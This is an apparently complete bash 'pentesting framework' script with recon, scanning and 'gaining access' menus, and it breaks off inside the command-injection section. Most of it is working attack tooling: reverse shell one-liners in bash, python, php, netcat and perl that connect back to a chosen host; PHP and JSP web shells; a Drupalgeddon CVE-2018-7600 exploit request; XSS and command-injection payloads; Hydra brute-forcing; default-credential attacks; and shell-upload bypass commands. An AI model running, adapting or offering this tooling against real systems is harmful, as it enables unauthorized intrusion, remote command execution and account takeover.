#!/bin/bash
# Filename: apex-pentest.sh
# Modern All-in-One Pentesting Framework
# Usage: chmod +x apex-pentest.sh && sudo ./apex-pentest.sh

# Color Scheme
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'
BOLD='\033[1m'

# Global Variables
TARGET=""
TARGET_IP=""
TARGET_DOMAIN=""
PORT=""
USERNAME=""
PASSWORD=""
LHOST=$(hostname -I | awk '{print $1}')
LPORT=4444
SESSION_ID=$(date +%s)
RESULTS_DIR="/tmp/apex_$SESSION_ID"

# Create results directory
mkdir -p "$RESULTS_DIR"

# Banner
clear
echo -e "${CYAN}${BOLD}"
cat << "EOF"
    █████╗ ██████╗ ███████╗██╗  ██╗███████╗
   ██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝
   ███████║██████╔╝█████╗  ███████║█████╗  
   ██╔══██║██╔═══╝ ██╔══╝  ██╔══██║██╔══╝  
   ██║  ██║██║     ███████╗██║  ██║███████╗
   ╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝
     Modern Pentesting Framework v3.0
EOF
echo -e "${NC}${BOLD}Target: ${GREEN}${TARGET:-None Set}${NC}"
echo -e "${BOLD}LHOST: ${GREEN}$LHOST${NC} | Session: ${GREEN}$SESSION_ID${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[!] For authorized security testing only!${NC}\n"

# Dependency Check
check_deps() {
    echo -e "${BLUE}[*] Checking dependencies...${NC}"
    missing=()
    
    # Essential tools
    essential_tools=("nmap" "curl" "git" "python3" "gobuster" "nikto" "sqlmap" "hydra")
    
    for tool in "${essential_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing+=("$tool")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${YELLOW}[!] Missing tools: ${missing[*]}${NC}"
        read -p "Install? (y/n): " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            sudo apt update
            sudo apt install -y "${missing[@]}" gobuster nikto sqlmap hydra
        fi
    else
        echo -e "${GREEN}[+] All essential tools found${NC}"
    fi
}

# Set Target
set_target() {
    echo -e "${PURPLE}[*] Target Configuration${NC}"
    echo -ne "${CYAN}[?] Enter target (URL/IP): ${NC}"
    read TARGET
    
    # Check if it's an IP or domain
    if [[ $TARGET =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        TARGET_IP="$TARGET"
        echo -e "${GREEN}[+] Target IP set: $TARGET_IP${NC}"
        
        # Try to get domain name
        TARGET_DOMAIN=$(dig -x "$TARGET_IP" +short 2>/dev/null | head -1)
        [ -n "$TARGET_DOMAIN" ] && echo -e "${GREEN}[+] Resolved to: $TARGET_DOMAIN${NC}"
    else
        TARGET_DOMAIN="$TARGET"
        echo -e "${GREEN}[+] Target domain set: $TARGET_DOMAIN${NC}"
        
        # Get IP address
        TARGET_IP=$(dig +short "$TARGET_DOMAIN" | head -1)
        [ -n "$TARGET_IP" ] && echo -e "${GREEN}[+] Resolved to: $TARGET_IP${NC}"
    fi
    
    # Quick connectivity check
    echo -ne "${CYAN}[?] Port to test (default 80): ${NC}"
    read PORT
    PORT=${PORT:-80}
    
    if timeout 2 nc -z "$TARGET_IP" "$PORT" &>/dev/null; then
        echo -e "${GREEN}[✓] $TARGET:$PORT is reachable${NC}"
    else
        echo -e "${YELLOW}[!] $TARGET:$PORT may be filtered${NC}"
    fi
}

# Reconnaissance Module
recon_menu() {
    while true; do
        clear
        echo -e "${CYAN}${BOLD}══════════ RECONNAISSANCE ══════════${NC}"
        echo -e "${BOLD}Target: ${GREEN}$TARGET${NC}"
        echo ""
        echo -e "${WHITE}1.${NC} Passive Recon (Subdomains/Emails)"
        echo -e "${WHITE}2.${NC} Active Scanning (Ports/Services)"
        echo -e "${WHITE}3.${NC} Web Enumeration (Directories/Pages)"
        echo -e "${WHITE}4.${NC} Technology Stack Detection"
        echo -e "${WHITE}5.${NC} Hidden Login Page Finder"
        echo -e "${WHITE}6.${NC} Email/Username Harvesting"
        echo -e "${WHITE}7.${NC} Cloud Infrastructure Check"
        echo -e "${WHITE}8.${NC} Return to Main Menu"
        echo ""
        echo -ne "${CYAN}[?] Select option (1-8): ${NC}"
        read recon_choice
        
        case $recon_choice in
            1)
                echo -e "\n${PURPLE}[*] Passive Reconnaissance${NC}"
                echo -e "${CYAN}[+] Finding subdomains...${NC}"
                
                # Using curl with multiple sources
                echo -e "\n${YELLOW}═════════ SUBDOMAIN DISCOVERY ═════════${NC}"
                
                # crt.sh certificates
                echo -e "${BLUE}[*] Checking SSL certificates (crt.sh)...${NC}"
                curl -s "https://crt.sh/?q=%25.$TARGET_DOMAIN&output=json" | \
                    jq -r '.[].name_value' 2>/dev/null | \
                    sed 's/\*\.//g' | sort -u | tee "$RESULTS_DIR/subdomains.txt"
                
                # SecurityTrails API (free tier)
                echo -e "\n${BLUE}[*] Checking SecurityTrails API...${NC}"
                curl -s "https://api.securitytrails.com/v1/domain/$TARGET_DOMAIN/subdomains" \
                    -H "APIKEY: YOUR_API_KEY" 2>/dev/null | \
                    jq -r '.subdomains[]' 2>/dev/null | \
                    awk "{print \$0\".$TARGET_DOMAIN\"}" | tee -a "$RESULTS_DIR/subdomains.txt"
                
                # Remove duplicates
                sort -u "$RESULTS_DIR/subdomains.txt" -o "$RESULTS_DIR/subdomains.txt"
                
                echo -e "\n${GREEN}[+] Found $(wc -l < "$RESULTS_DIR/subdomains.txt") unique subdomains${NC}"
                echo -e "${CYAN}[?] Test subdomains for live hosts? (y/n): ${NC}"
                read -n 1 -r
                if [[ $REPLY =~ ^[Yy]$ ]]; then
                    echo -e "\n${BLUE}[*] Checking live subdomains...${NC}"
                    while read -r sub; do
                        if curl -s -I "http://$sub" --max-time 2 &>/dev/null; then
                            echo -e "${GREEN}[✓] LIVE: $sub${NC}"
                        fi
                    done < "$RESULTS_DIR/subdomains.txt"
                fi
                ;;
            
            2)
                echo -e "\n${PURPLE}[*] Active Scanning${NC}"
                echo -e "${CYAN}[?] Scan type:${NC}"
                echo "1. Quick Scan (Top 100 ports)"
                echo "2. Full Scan (All ports)"
                echo "3. Service Version Detection"
                echo "4. UDP Scan"
                echo -ne "${CYAN}[?] Select: ${NC}"
                read scan_type
                
                case $scan_type in
                    1)
                        echo -e "\n${BLUE}[*] Quick TCP Scan...${NC}"
                        nmap -T4 -F "$TARGET_IP" | tail -n +5
                        ;;
                    2)
                        echo -e "\n${BLUE}[*] Full Port Scan...${NC}"
                        nmap -T4 -p- "$TARGET_IP" | grep "open"
                        ;;
                    3)
                        echo -e "\n${BLUE}[*] Service Version Detection...${NC}"
                        nmap -sV -sC "$TARGET_IP" | tail -n +6
                        ;;
                    4)
                        echo -e "\n${BLUE}[*] UDP Scan (Top 100)...${NC}"
                        sudo nmap -sU --top-ports 100 "$TARGET_IP" | grep "open"
                        ;;
                esac
                ;;
            
            3)
                echo -e "\n${PURPLE}[*] Web Enumeration${NC}"
                echo -e "${CYAN}[?] Directory brute-force:${NC}"
                
                # Check for common directories
                echo -e "\n${BLUE}[*] Testing common directories...${NC}"
                common_dirs=("/admin" "/login" "/wp-admin" "/administrator" "/backup" "/api" "/test")
                
                for dir in "${common_dirs[@]}"; do
                    status=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET$dir" -m 2)
                    if [[ "$status" =~ ^[23] ]]; then
                        echo -e "${GREEN}[✓] Found: $TARGET$dir (HTTP $status)${NC}"
                    fi
                done
                
                # Gobuster scan
                echo -e "\n${BLUE}[*] Starting Gobuster scan...${NC}"
                wordlist="/usr/share/wordlists/dirb/common.txt"
                if [ -f "$wordlist" ]; then
                    gobuster dir -u "http://$TARGET" -w "$wordlist" -t 20 2>/dev/null | \
                        grep -E "(Status: 200|Status: 301|Status: 302|Status: 403)"
                else
                    echo -e "${YELLOW}[!] Wordlist not found${NC}"
                fi
                ;;
            
            4)
                echo -e "\n${PURPLE}[*] Technology Stack Detection${NC}"
                echo -e "${BLUE}[*] Analyzing $TARGET...${NC}"
                
                # Check headers
                echo -e "\n${YELLOW}═════════ HTTP HEADERS ═════════${NC}"
                curl -I "http://$TARGET" 2>/dev/null | grep -E "(Server:|X-Powered-By:|Content-Type:)"
                
                # WhatWeb scan
                echo -e "\n${YELLOW}═════════ TECHNOLOGY STACK ═════════${NC}"
                if command -v whatweb &> /dev/null; then
                    whatweb -a 3 "http://$TARGET" 2>/dev/null | head -20
                else
                    # Manual detection
                    curl -s "http://$TARGET" | grep -i -E "(jquery|bootstrap|react|vue\.js|wordpress|drupal|joomla)"
                fi
                
                # Check for WAF
                echo -e "\n${YELLOW}═════════ WAF DETECTION ═════════${NC}"
                curl -s "http://$TARGET" -H "X-Forwarded-For: 1.1.1.1" | \
                    grep -i -E "(cloudflare|akamai|sucuri|incapsula|mod_security)" && \
                    echo -e "${YELLOW}[!] WAF detected${NC}"
                ;;
            
            5)
                echo -e "\n${PURPLE}[*] Hidden Login Page Finder${NC}"
                echo -e "${BLUE}[*] Testing common login pages...${NC}"
                
                login_paths=(
                    "/admin" "/admin/login" "/admin/admin" "/administrator"
                    "/wp-login.php" "/wp-admin" "/login" "/signin"
                    "/auth" "/authentication" "/console" "/manager"
                    "/portal" "/dashboard" "/controlpanel" "/cpanel"
                    "/webadmin" "/sysadmin" "/user/login" "/member/login"
                    "/secure" "/private" "/restricted" "/internal"
                    "/backoffice" "/admincp" "/admin_area" "/panel"
                )
                
                found_logins=()
                for path in "${login_paths[@]}"; do
                    url="http://$TARGET$path"
                    echo -ne "Testing: $path\r"
                    
                    response=$(curl -s -o /dev/null -w "%{http_code} %{size_download}" "$url" -m 2)
                    code=$(echo "$response" | awk '{print $1}')
                    size=$(echo "$response" | awk '{print $2}')
                    
                    if [[ "$code" =~ ^[23] && "$size" -gt 100 ]]; then
                        echo -e "\n${GREEN}[✓] Potential login page: $url (HTTP $code, ${size} bytes)${NC}"
                        found_logins+=("$url")
                        
                        # Check if it's actually a login form
                        if curl -s "$url" | grep -i -E "(password|username|login|sign in)" &>/dev/null; then
                            echo -e "${GREEN}[!] Contains login form!${NC}"
                        fi
                    fi
                done
                echo -e "\n${GREEN}[+] Found ${#found_logins[@]} potential login pages${NC}"
                
                if [ ${#found_logins[@]} -gt 0 ]; then
                    echo -e "\n${CYAN}[?] Test default credentials? (y/n): ${NC}"
                    read -n 1 -r
                    if [[ $REPLY =~ ^[Yy]$ ]]; then
                        test_default_creds "${found_logins[0]}"
                    fi
                fi
                ;;
            
            6)
                echo -e "\n${PURPLE}[*] Email/Username Harvesting${NC}"
                
                # Check GitHub for emails
                echo -e "${BLUE}[*] Searching GitHub commits...${NC}"
                curl -s "https://api.github.com/search/commits?q=repo:$TARGET_DOMAIN" \
                    -H "Accept: application/vnd.github.cloak-preview" 2>/dev/null | \
                    jq -r '.items[].commit.author.email' 2>/dev/null | sort -u
                
                # Hunter.io API (placeholder)
                echo -e "\n${BLUE}[*] Checking email patterns...${NC}"
                common_emails=("admin@$TARGET_DOMAIN" "webmaster@$TARGET_DOMAIN" 
                              "info@$TARGET_DOMAIN" "support@$TARGET_DOMAIN")
                
                for email in "${common_emails[@]}"; do
                    echo "$email"
                done
                ;;
            
            7)
                echo -e "\n${PURPLE}[*] Cloud Infrastructure Check${NC}"
                
                # Check for AWS S3 buckets
                echo -e "${BLUE}[*] Testing for AWS S3 buckets...${NC}"
                aws_urls=("https://s3.amazonaws.com/$TARGET_DOMAIN" 
                         "https://$TARGET_DOMAIN.s3.amazonaws.com")
                
                for url in "${aws_urls[@]}"; do
                    if curl -s -I "$url" 2>/dev/null | grep -q "200 OK"; then
                        echo -e "${GREEN}[!] Open S3 bucket found: $url${NC}"
                    fi
                done
                
                # Check for Azure blobs
                echo -e "\n${BLUE}[*] Testing for Azure blobs...${NC}"
                azure_url="https://$TARGET_DOMAIN.blob.core.windows.net/"
                curl -s -I "$azure_url" 2>/dev/null | grep -q "200 OK" && \
                    echo -e "${GREEN}[!] Azure blob storage found${NC}"
                ;;
            
            8)
                return
                ;;
        esac
        
        echo -e "\n${CYAN}[?] Press Enter to continue...${NC}"
        read -r
    done
}

# Test default credentials
test_default_creds() {
    local login_url="$1"
    echo -e "\n${YELLOW}═════════ DEFAULT CREDENTIALS TEST ═════════${NC}"
    
    # Common credentials
    creds=(
        "admin:admin"
        "admin:password"
        "admin:123456"
        "administrator:admin"
        "root:root"
        "test:test"
        "guest:guest"
    )
    
    for cred in "${creds[@]}"; do
        username=$(echo "$cred" | cut -d: -f1)
        password=$(echo "$cred" | cut -d: -f2)
        
        echo -ne "Testing: $username/$password\r"
        
        # Try POST request
        response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$login_url" \
            -d "username=$username&password=$password" -m 3)
        
        if [[ "$response" == "302" ]] || [[ "$response" == "200" ]]; then
            # Check if redirected to different page
            location=$(curl -s -I -X POST "$login_url" \
                -d "username=$username&password=$password" 2>/dev/null | \
                grep -i "location:" | head -1)
            
            if [[ "$location" != *"login"* ]] && [[ "$location" != *"error"* ]]; then
                echo -e "\n${GREEN}[!] POSSIBLE SUCCESS: $username/$password${NC}"
                echo -e "${GREEN}[!] Redirect: $location${NC}"
                return
            fi
        fi
    done
    echo -e "\n${RED}[-] No default credentials worked${NC}"
}

# Scanning Module
scanning_menu() {
    while true; do
        clear
        echo -e "${CYAN}${BOLD}═══════════ SCANNING ═══════════${NC}"
        echo -e "${BOLD}Target: ${GREEN}$TARGET${NC}"
        echo ""
        echo -e "${WHITE}1.${NC} Vulnerability Scan (Nuclei)"
        echo -e "${WHITE}2.${NC} Web Vulnerability Scanner (Nikto)"
        echo -e "${WHITE}3.${NC} SSL/TLS Security Check"
        echo -e "${WHITE}4.${NC} WordPress Security Scan"
        echo -e "${WHITE}5.${NC} CMS Detection & Exploits"
        echo -e "${WHITE}6.${NC} API Endpoint Discovery"
        echo -e "${WHITE}7.${NC} Custom Payload Injection"
        echo -e "${WHITE}8.${NC} Return to Main Menu"
        echo ""
        echo -ne "${CYAN}[?] Select option (1-8): ${NC}"
        read scan_choice
        
        case $scan_choice in
            1)
                echo -e "\n${PURPLE}[*] Vulnerability Scan with Nuclei${NC}"
                if command -v nuclei &> /dev/null; then
                    echo -e "${BLUE}[*] Running Nuclei with top templates...${NC}"
                    nuclei -u "http://$TARGET" -t cves/ -severity critical,high -silent
                    nuclei -u "http://$TARGET" -t exposures/ -severity critical,high -silent
                else
                    echo -e "${YELLOW}[!] Nuclei not installed${NC}"
                    echo "Install: go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest"
                fi
                ;;
            
            2)
                echo -e "\n${PURPLE}[*] Web Vulnerability Scan${NC}"
                echo -e "${BLUE}[*] Running Nikto...${NC}"
                nikto -h "http://$TARGET" -Format txt 2>/dev/null | \
                    grep -E "(OSVDB|\+)" | head -30
                
                # Custom checks
                echo -e "\n${BLUE}[*] Custom security checks...${NC}"
                
                # Check for backup files
                backups=(".bak" ".old" ".backup" ".tar" ".zip" ".sql" ".txt")
                for ext in "${backups[@]}"; do
                    curl -s -o /dev/null -w "%{http_code}" "http://$TARGET/index.php$ext" -m 2 | \
                        grep -q "200" && echo -e "${YELLOW}[!] Backup file found: index.php$ext${NC}"
                done
                ;;
            
            3)
                echo -e "\n${PURPLE}[*] SSL/TLS Security Check${NC}"
                echo -e "${BLUE}[*] Testing SSL configuration...${NC}"
                
                # TestSSL.sh style checks
                if command -v testssl.sh &> /dev/null; then
                    testssl.sh "https://$TARGET" 2>/dev/null | grep -A5 "Testing"
                else
                    # Basic SSL check
                    echo | openssl s_client -connect "$TARGET:443" -servername "$TARGET" 2>/dev/null | \
                        openssl x509 -noout -text | grep -E "(Signature Algorithm|Not Before|Not After|Issuer:)"
                    
                    # Check for weak protocols
                    echo -e "\n${YELLOW}═════════ PROTOCOL CHECK ═════════${NC}"
                    for proto in ssl2 ssl3 tls1 tls1_1 tls1_2 tls1_3; do
                        echo -ne "Testing $proto...\r"
                        if echo | openssl s_client -connect "$TARGET:443" -$proto 2>/dev/null | \
                            grep -q "CONNECTED"; then
                            echo -e "${GREEN}[✓] $proto supported${NC}"
                        fi
                    done
                fi
                ;;
            
            4)
                echo -e "\n${PURPLE}[*] WordPress Security Scan${NC}"
                echo -e "${BLUE}[*] Checking if WordPress...${NC}"
                
                # Check for WordPress
                if curl -s "http://$TARGET" | grep -q "wp-content\|wp-includes\|wordpress"; then
                    echo -e "${GREEN}[✓] WordPress detected${NC}"
                    
                    # Check version
                    readme=$(curl -s "http://$TARGET/readme.html")
                    if echo "$readme" | grep -q "WordPress"; then
                        version=$(echo "$readme" | grep -i "version" | head -1)
                        echo -e "${YELLOW}[!] $version${NC}"
                    fi
                    
                    # Check for common vulnerabilities
                    echo -e "\n${BLUE}[*] Testing common WordPress issues...${NC}"
                    
                    # XML-RPC enabled (often used for brute force)
                    curl -s -X POST "http://$TARGET/xmlrpc.php" -d "<?xml version=\"1.0\"?>" | \
                        grep -q "XML-RPC" && echo -e "${YELLOW}[!] XML-RPC enabled (brute force possible)${NC}"
                    
                    # User enumeration
                    curl -s "http://$TARGET/?author=1" | grep -q "author" && \
                        echo -e "${YELLOW}[!] User enumeration possible${NC}"
                    
                    # Check for wp-config backup
                    curl -s -o /dev/null -w "%{http_code}" "http://$TARGET/wp-config.php.bak" -m 2 | \
                        grep -q "200" && echo -e "${RED}[!] wp-config.php backup exposed!${NC}"
                    
                else
                    echo -e "${RED}[-] Not a WordPress site${NC}"
                fi
                ;;
            
            5)
                echo -e "\n${PURPLE}[*] CMS Detection & Exploits${NC}"
                
                # Detect CMS
                echo -e "${BLUE}[*] Detecting CMS...${NC}"
                
                # Joomla
                curl -s "http://$TARGET" | grep -q "joomla\|Joomla" && \
                    echo -e "${GREEN}[✓] Joomla detected${NC}" && \
                    echo -e "${YELLOW}[!] Check: /administrator for login${NC}"
                
                # Drupal
                curl -s "http://$TARGET" | grep -q "Drupal\|drupal" && \
                    echo -e "${GREEN}[✓] Drupal detected${NC}" && \
                    echo -e "${YELLOW}[!] Check: /user/login for login${NC}"
                
                # Check for known exploits
                echo -e "\n${BLUE}[*] Checking for known vulnerabilities...${NC}"
                
                # Drupalgeddon (CVE-2018-7600)
                response=$(curl -s -X POST "http://$TARGET/user/register?element_parents=account/mail/%23value&ajax_form=1" \
                    -d "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=whoami")
                
                if echo "$response" | grep -q "root\|www-data\|admin"; then
                    echo -e "${RED}[!] VULNERABLE to Drupalgeddon (CVE-2018-7600)${NC}"
                    echo -e "${GREEN}[+] Command injection possible!${NC}"
                fi
                ;;
            
            6)
                echo -e "\n${PURPLE}[*] API Endpoint Discovery${NC}"
                
                # Common API endpoints
                api_endpoints=(
                    "/api" "/api/v1" "/api/v2" "/graphql" "/rest" "/soap"
                    "/oauth" "/oauth2" "/swagger" "/swagger-ui" "/openapi"
                    "/admin/api" "/user/api" "/mobile/api" "/web/api"
                )
                
                echo -e "${BLUE}[*] Discovering API endpoints...${NC}"
                for endpoint in "${api_endpoints[@]}"; do
                    url="http://$TARGET$endpoint"
                    status=$(curl -s -o /dev/null -w "%{http_code}" "$url" -m 2)
                    
                    case $status in
                        200|201|401|403)
                            echo -e "${GREEN}[✓] Found: $endpoint (HTTP $status)${NC}"
                            
                            # Check if it returns JSON
                            if curl -s "$url" | python3 -m json.tool 2>/dev/null; then
                                echo -e "${GREEN}[!] Returns valid JSON${NC}"
                            fi
                            ;;
                    esac
                done
                
                # Test for common API vulnerabilities
                echo -e "\n${BLUE}[*] Testing for broken object level authorization...${NC}"
                echo -e "${YELLOW}[!] Manual testing required:${NC}"
                echo "1. Find user ID endpoints (/api/users/1)"
                echo "2. Try accessing other users' data by changing ID"
                echo "3. Check for missing authorization headers"
                ;;
            
            7)
                echo -e "\n${PURPLE}[*] Custom Payload Injection${NC}"
                echo -e "${CYAN}[?] Injection type:${NC}"
                echo "1. SQL Injection"
                echo "2. XSS Payloads"
                echo "3. Command Injection"
                echo "4. LFI/RFI"
                echo -ne "${CYAN}[?] Select: ${NC}"
                read inj_type
                
                case $inj_type in
                    1)
                        echo -e "\n${BLUE}[*] SQL Injection Testing${NC}"
                        echo -e "${YELLOW}[!] Using sqlmap (comprehensive)${NC}"
                        if command -v sqlmap &> /dev/null; then
                            echo -e "${CYAN}[?] Enter vulnerable URL (with parameter): ${NC}"
                            read sql_url
                            sqlmap -u "$sql_url" --batch --random-agent --level 2
                        else
                            echo -e "${YELLOW}[!] sqlmap not installed${NC}"
                            echo "Manual test: Try ' OR '1'='1' --"
                        fi
                        ;;
                    2)
                        echo -e "\n${BLUE}[*] XSS Payload Testing${NC}"
                        xss_payloads=(
                            "<script>alert('XSS')</script>"
                            "<img src=x onerror=alert(1)>"
                            "\"><script>alert(1)</script>"
                            "javascript:alert(1)"
                        )
                        
                        echo -e "${CYAN}[?] Enter parameter to test: ${NC}"
                        read param
                        
                        for payload in "${xss_payloads[@]}"; do
                            echo -ne "Testing: $payload\r"
                            curl -s "http://$TARGET?$param=$payload" | grep -q "$payload" && \
                                echo -e "\n${YELLOW}[!] Possible XSS with: $payload${NC}"
                        done
                        ;;
                esac
                ;;
            
            8)
                return
                ;;
        esac
        
        echo -e "\n${CYAN}[?] Press Enter to continue...${NC}"
        read -r
    done
}

# Gaining Access Module
gain_access_menu() {
    while true; do
        clear
        echo -e "${CYAN}${BOLD}════════ GAINING ACCESS ════════${NC}"
        echo -e "${BOLD}Target: ${GREEN}$TARGET${NC}"
        echo ""
        echo -e "${WHITE}1.${NC} Reverse Shell Generator"
        echo -e "${WHITE}2.${NC} Password Bruteforce (Hydra)"
        echo -e "${WHITE}3.${NC} Exploit Finder & Launcher"
        echo -e "${WHITE}4.${NC} Web Shell Upload"
        echo -e "${WHITE}5.${NC} Command Injection Exploit"
        echo -e "${WHITE}6.${NC} File Upload Bypass"
        echo -e "${WHITE}7.${NC} Deserialization Attack"
        echo -e "${WHITE}8.${NC} Return to Main Menu"
        echo ""
        echo -ne "${CYAN}[?] Select option (1-8): ${NC}"
        read gain_choice
        
        case $gain_choice in
            1)
                echo -e "\n${PURPLE}[*] Reverse Shell Generator${NC}"
                echo -e "${CYAN}[?] Select shell type:${NC}"
                echo "1. bash"
                echo "2. python"
                echo "3. php"
                echo "4. netcat"
                echo "5. perl"
                echo -ne "${CYAN}[?] Select: ${NC}"
                read shell_type
                
                echo -ne "${CYAN}[?] LHOST [$LHOST]: ${NC}"
                read custom_lhost
                LHOST=${custom_lhost:-$LHOST}
                
                echo -ne "${CYAN}[?] LPORT [4444]: ${NC}"
                read custom_lport
                LPORT=${custom_lport:-4444}
                
                echo -e "\n${GREEN}[+] Reverse Shell Commands:${NC}"
                echo -e "${YELLOW}════════════════════════════════════════════════${NC}"
                
                case $shell_type in
                    1)
                        echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
                        echo ""
                        echo "Encoded:"
                        echo "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
                        ;;
                    2)
                        echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
                        ;;
                    3)
                        echo "php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                        echo ""
                        echo "For web shell:"
                        echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\"); ?>"
                        ;;
                    4)
                        echo "nc -e /bin/sh $LHOST $LPORT"
                        echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
                        ;;
                    5)
                        echo "perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
                        ;;
                esac
                
                echo -e "${YELLOW}════════════════════════════════════════════════${NC}"
                echo -e "\n${BLUE}[*] Start listener in another terminal:${NC}"
                echo "nc -lvnp $LPORT"
                echo -e "\n${GREEN}[!] After gaining access, proceed to Maintaining Access${NC}"
                ;;
            
            2)
                echo -e "\n${PURPLE}[*] Password Bruteforce Attack${NC}"
                echo -e "${CYAN}[?] Service to attack:${NC}"
                echo "1. SSH"
                echo "2. FTP"
                echo "3. HTTP Basic Auth"
                echo "4. WordPress login"
                echo "5. Custom login form"
                echo -ne "${CYAN}[?] Select: ${NC}"
                read service_type
                
                case $service_type in
                    1)
                        echo -e "\n${BLUE}[*] SSH Bruteforce${NC}"
                        echo -ne "${CYAN}[?] Username [root]: ${NC}"
                        read ssh_user
                        ssh_user=${ssh_user:-root}
                        
                        echo -ne "${CYAN}[?] Password list path [/usr/share/wordlists/rockyou.txt]: ${NC}"
                        read pass_list
                        pass_list=${pass_list:-/usr/share/wordlists/rockyou.txt}
                        
                        echo -e "\n${YELLOW}[!] Starting Hydra attack...${NC}"
                        hydra -l "$ssh_user" -P "$pass_list" ssh://$TARGET -t 4
                        ;;
                    
                    3)
                        echo -e "\n${BLUE}[*] HTTP Basic Auth Bruteforce${NC}"
                        echo -e "${CYAN}[?] Enter protected URL: ${NC}"
                        read protected_url
                        
                        echo -e "\n${YELLOW}[!] Starting attack...${NC}"
                        hydra -l admin -P /usr/share/wordlists/rockyou.txt \
                            "$protected_url" http-get
                        ;;
                    
                    4)
                        echo -e "\n${BLUE}[*] WordPress Login Bruteforce${NC}"
                        echo -e "${YELLOW}[!] Using wpscan style attack...${NC}"
                        
                        # Test with common credentials first
                        echo -e "${BLUE}[*] Testing common credentials...${NC}"
                        common_creds=("admin:admin" "admin:password" "admin:123456" "administrator:admin")
                        
                        for cred in "${common_creds[@]}"; do
                            user=$(echo $cred | cut -d: -f1)
                            pass=$(echo $cred | cut -d: -f2)
                            
                            response=$(curl -s -o /dev/null -w "%{http_code}" \
                                -X POST "http://$TARGET/wp-login.php" \
                                -d "log=$user&pwd=$pass&wp-submit=Log+In" \
                                --cookie-jar /tmp/cookies.txt)
                            
                            if [ "$response" == "302" ]; then
                                echo -e "${GREEN}[!] SUCCESS: $user/$pass${NC}"
                                break
                            fi
                        done
                        ;;
                esac
                ;;
            
            3)
                echo -e "\n${PURPLE}[*] Exploit Finder & Launcher${NC}"
                
                # Search for exploits
                echo -ne "${CYAN}[?] Service/Software name: ${NC}"
                read software
                
                echo -e "\n${BLUE}[*] Searching for exploits...${NC}"
                
                # Search Exploit-DB locally
                if [ -d "/usr/share/exploitdb" ]; then
                    searchsploit "$software" 2>/dev/null | head -20
                    
                    echo -e "\n${CYAN}[?] Exploit ID to examine: ${NC}"
                    read exploit_id
                    
                    if [ -n "$exploit_id" ]; then
                        searchsploit -x "$exploit_id"
                        
                        echo -e "\n${CYAN}[?] Download and run? (y/n): ${NC}"
                        read -n 1 -r
                        if [[ $REPLY =~ ^[Yy]$ ]]; then
                            searchsploit -m "$exploit_id"
                            echo -e "\n${GREEN}[+] Exploit downloaded${NC}"
                        fi
                    fi
                else
                    echo -e "${YELLOW}[!] Exploit-DB not installed${NC}"
                    echo "Install: sudo apt install exploitdb"
                fi
                ;;
            
            4)
                echo -e "\n${PURPLE}[*] Web Shell Upload${NC}"
                echo -e "${BLUE}[*] Generating web shells...${NC}"
                
                # Create PHP web shell
                cat > /tmp/shell.php << EOF
<?php
// Web Shell by Apex Pentest
if(isset(\$_GET['cmd'])) {
    system(\$_GET['cmd']);
}
if(isset(\$_POST['cmd'])) {
    system(\$_POST['cmd']);
}
?>
<form method="POST">
CMD: <input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>
EOF
                
                echo -e "${GREEN}[+] PHP web shell created: /tmp/shell.php${NC}"
                
                # Create JSP web shell
                cat > /tmp/shell.jsp << EOF
<%-- JSP Web Shell --%>
<%@ page import="java.util.*,java.io.*"%>
<%
if(request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while(disr != null) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
<form method="POST">
CMD: <input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>
EOF
                
                echo -e "${GREEN}[+] JSP web shell created: /tmp/shell.jsp${NC}"
                
                echo -e "\n${YELLOW}[!] Upload techniques:${NC}"
                echo "1. Direct file upload (if available)"
                echo "2. File inclusion + local file upload"
                echo "3. Bypass file type restrictions"
                echo ""
                echo -e "${CYAN}[?] Try common upload paths:${NC}"
                echo "curl -F 'file=@/tmp/shell.php' http://$TARGET/upload.php"
                echo "curl -F 'image=@/tmp/shell.php;type=image/jpeg' http://$TARGET/upload"
                ;;
            
            5)
                echo -e "\n${PURPLE}[*] Command Injection Exploit${NC}"
                echo -e "${BLUE}[*] Testing for command injection...${NC}"
                
                # Common injection payloads
                payloads=(
                    ";whoami"
                    "|whoami"
                    "||whoami"
                    "&&whoami"
                    "\`whoami\`"
                    "\$(whoami)"
                    "';whoami;'"
                    "\";whoami;\""
                )
                
